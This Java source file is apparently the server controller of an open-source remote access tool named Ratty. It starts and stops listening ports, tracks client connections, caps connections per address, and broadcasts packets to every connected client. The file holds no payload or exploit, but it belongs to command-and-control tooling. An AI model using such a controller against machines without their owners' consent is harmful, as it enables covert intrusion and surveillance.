/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.server;

import java.util.ArrayList;
import java.util.Optional;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.IConnectionObserver;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;

public abstract class AbstractRattyController implements IServerObserver, IConnectionObserver {
	
	protected ArrayList<ActiveServer> servers;
	protected ArrayList<ActiveConnection> connections;
	
	private static final int MAX_SAME_CONNECTION_COUNT = 3;
	
	public AbstractRattyController() {
		servers = new ArrayList<ActiveServer>();
		connections = new ArrayList<ActiveConnection>();
	}
	
	public void startServer(final int port) {
		if (isServerStarted(port)) {
			return;
		}
		
		final ActiveServer server = new ActiveServer(port);
		
		server.setObserver(this);
		server.start();
		
		servers.add(server);
	}
	
	public void stopServer(final int port) {
		final Optional<ActiveServer> optional = servers.stream()
				.filter(server -> server.getPort() == port)
				.findFirst();
		
		if (!optional.isPresent()) {
			return;
		}
		
		final ActiveServer server = optional.get();
		
		server.setObserver(null);
		server.close();
		
		servers.remove(server);
	}
	
	public boolean isServerStarted(final int port) {
		final boolean started = servers.stream()
				.filter(server -> server.getPort() == port)
				.findAny()
				.isPresent();
		
		return started;
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		final String address = connection.getAddress();
		final long size = connections.stream()
				.filter(con -> con.getAddress().equals(address))
				.count();
		
		if (size >= MAX_SAME_CONNECTION_COUNT) {
			final FreePacket free = new FreePacket();
			
			connection.start();
			connection.addPacket(free);
		} else {
			final InformationPacket packet = new InformationPacket();
			
			connection.setObserver(this);
			connections.add(connection);
			connection.start();
			connection.addPacket(packet);
		}
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		connections.remove(connection);
		connection.setObserver(null);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		final int port = server.getPort();
		
		connections.stream().filter(connection -> connection.getPort() == port).forEach(ActiveConnection::close);
		
		server.setObserver(null);
		servers.remove(server);
	}
	
	public void broadcast(final IPacket packet) {
		connections.forEach(connection -> {
			connection.addPacket(packet);
		});
	}
	
}
